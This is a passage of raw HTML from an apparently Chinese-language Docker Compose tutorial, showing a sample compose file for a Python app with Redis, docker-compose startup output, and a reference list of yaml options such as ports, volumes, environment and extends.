-o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-1\"><span class=\"crayon-s \">web</span><span class=\"\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">command</span><span class=\"\">: python app.py</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-i \">“5000:5000”</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-6\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">volumes</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-o\">.</span><span class=\"\">:/code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-8\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-9\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span>redis</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-10\"><span class=\"crayon-s \">redis</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: redis</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0007 seconds] --><br><p></p><br><p><strong>第三步</strong>，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c5a806091571\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">Creating myapp_redis_1…<br>Creating myapp_web_1…<br>Building web…<br>Step 0 : FROM python:2.7<br>2.7: Pulling from python<br>…<br>Status: Downloaded newer image for python:2.7<br> —&gt; d833e0b23482<br>Step 1 : ADD . /code<br> —&gt; 1c04b1b15808<br>Removing intermediate container 9dab91b4410d<br>Step 2 : WORKDIR /code<br> —&gt; Running in f495a62feac9<br> —&gt; ffea89a7b090<br>Attaching to myapp_redis_1, myapp_web_1<br>……<br>redis_1 | [1] 17 May 10:42:38.147 <em> The server is now ready to accept connections on port 6379<br>web_1   |  </em> Running on <a href=\"http://0.0.0.0:5000/\" target=\"_blank\" rel=\"external\">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)<br>web_1   |  <em> Restarting with stat</em></textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-19\">19</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-1\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-2\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_web_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-3\"><span class=\"crayon-e\">Building </span><span class=\"crayon-v\">web</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-4\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-5\"><span class=\"crayon-cn\">2.7</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-i\">python</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-7\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">d833e0b23482</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-9\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1c04b1b15808</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-11\"><span class=\"crayon-e\">Removing </span><span class=\"crayon-e\">intermediate </span><span class=\"crayon-i\">container</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9dab91b4410d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-12\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f495a62feac9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ffea89a7b090</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-15\"><span class=\"crayon-e\">Attaching </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp<em>web</em></span><span class=\"crayon-sy\"></span>1</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-16\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-17\"><span class=\"crayon-v\">redis_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38.147</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\"></span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">server </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now </span><span class=\"crayon-e\">ready </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">accept </span><span class=\"crayon-e\">connections </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-18\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\"><em></em></span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//0.0.0.0:5000/ (Press CTRL+C to quit)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-19\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\"></span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Restarting </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">stat</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0039 seconds] --><br><p></p><br><h2>3. Yaml文件参考</h2><br><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：<br><br><code>image</code>:镜像的ID<br><br><code>build</code>:直接从pwd的Dockerfile来build，而非通过image选项来pull<br><br><code>links</code>：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]<br><br><code>external_links</code>：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links<br><br><code>command</code>：替换默认的command命令<br><br><code>ports</code>: 导出端口。格式可以是：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c61341321587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">ports:-“3000”-“8000:8000”-“127.0.0.1:8001:8001”</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c61341321587-1\">1</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c61341321587-1\"><span class=\"crayon-v\">ports</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">“3000”</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">“8000:8000”</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">“127.0.0.1:8001:8001”</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0005 seconds] --><br><p></p><br><p><code>expose</code>：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。<br><br><code>volumes</code>：加载路径作为卷，可以指定只读模式：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c65962076142\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">volumes:-/var/lib/mysql<br> - cache/:/tmp/cache<br> -~/configs:/etc/configs/:ro</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c65962076142-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-3\">3</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-1\"><span class=\"crayon-v\">volumes</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c65962076142-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cache</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cache</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">ro</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0009 seconds] --><br><p></p><br><p><code>volumes_from</code>：加载其他容器或者服务的所有卷</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c69471704775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">environment:- RACK_ENV=development<br>  - SESSION_SECRET</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c69471704775-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c69471704775-2\">2</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c69471704775-1\"><span class=\"crayon-v\">environment</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RACK_ENV</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">development</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c69471704775-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SESSION_SECRET</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0005 seconds] --><br><p></p><br><p><code>env_file</code>：从一个文件中导入环境变量，文件的格式为RACK_ENV=development<br><br><code>extends</code>:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c6e528736605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">common.yml<br>webapp:<br>  build:./webapp<br>  environment:- DEBUG=false- SEND_EMAILS=false<br>development.yml<br>web:extends:<br>    file: common.yml<br>    service: webapp<br>  ports:-“8000:8000”<br>  links:- db<br>  environment:- DEBUG=true<br>db:<br>  image: postgres</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-13\">13</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-1\">common<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-2\"><span class=\"crayon-s \">webapp</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:./webapp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=false- SEND_EMAILS=false</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-5\">development<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-6\"><span class=\"crayon-s \">web</span><span class=\"\">:extends</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">file</span><span class=\"\">: common.yml</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-8\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">service</span><span class=\"\">: webapp</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-9\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:-“8000</span><span class=\"\">:8000”</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-10\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:- db</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-12\"><span class=\"crayon-s \">db</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-13\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: postgres</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0008 seconds] --><br><p></p><br><p><code>net</code>：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br><br><code>dns</code>：可以设置一个或多个自定义的DNS地址。<br><br><code>dns_search</code>:可以设置一个或多个DNS的扫描域。<br><br>其他的<code>working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares</code>，和<code>docker run</code>命令是一样的，这些命令都是单行的命令。例如：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c72058180962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">cpu_shares:73<br>working_dir:/code<br>entrypoint: /code/entrypoint.sh<br>user: postgresql<br>hostname: foo<br>domainname: foo.com<br>mem_limit:1000000000<br>privileged:true<br>restart: always<br>stdin_open:true<br>tty:true</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-11\">11</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-1\"><span class=\"crayon-v\">cpu_shares</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">73</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-2\"><span class=\"crayon-v\">working_dir</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-3\"><span 